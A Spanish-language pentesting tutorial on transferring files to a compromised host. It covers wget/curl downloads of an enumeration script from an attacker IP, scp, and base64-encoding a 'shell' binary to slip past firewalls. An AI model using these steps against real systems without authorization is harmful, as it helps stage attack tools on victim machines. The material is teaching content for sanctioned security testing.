# Transferring Files

Durante un test de penetración es habitual necesitar **transferir archivos** hacia el servidor remoto (scripts, exploits…) o traerlos de vuelta al host atacante.  
Con shells básicas (por ejemplo con un *reverse shell* sin Meterpreter) debemos recurrir a métodos manuales.

---

## 1. Usando `wget` o `curl`

1. En la máquina atacante, levantar un **servidor HTTP** sencillo con Python:

```bash
cd /tmp
python3 -m http.server 8000
```

2. En el host comprometido, descargar el archivo:

```bash
wget http://10.10.14.1:8000/linenum.sh
```

Si no hay `wget`, usar **cURL**:

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

> - `10.10.14.1` → IP de nuestra máquina.  
> - `8000` → puerto donde corre el servidor Python.  
> - `-o` → indica el nombre de archivo de salida.

---

## 2. Usando `scp`

Si tenemos **credenciales SSH** del host remoto, podemos copiar directamente:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

- Se indica el archivo local después de `scp` y tras `:` la ruta remota.

---

## 3. Usando **Base64**

Si el firewall bloquea descargas, podemos **codificar el archivo** en Base64 y pegar la cadena en el host remoto.

1. En el host atacante:

```bash
base64 shell -w 0
```

2. Copiar la cadena Base64 resultante al host remoto y decodificar:

```bash
echo f0VMRgIBAQAAAA...SNIP... | base64 -d > shell
```

---

## 4. Validación del archivo transferido

- **Comprobar tipo de archivo**:

```bash
file shell
# → Debe mostrar: ELF 64-bit ... u otro formato válido
```

- **Verificar integridad mediante hash MD5**:

En el host atacante:
```bash
md5sum shell
# Ejemplo → 321de1d7e7c3735838890a72c9ae7d1d  shell
```

En el host remoto:
```bash
md5sum shell
# Debe coincidir con el hash anterior
```


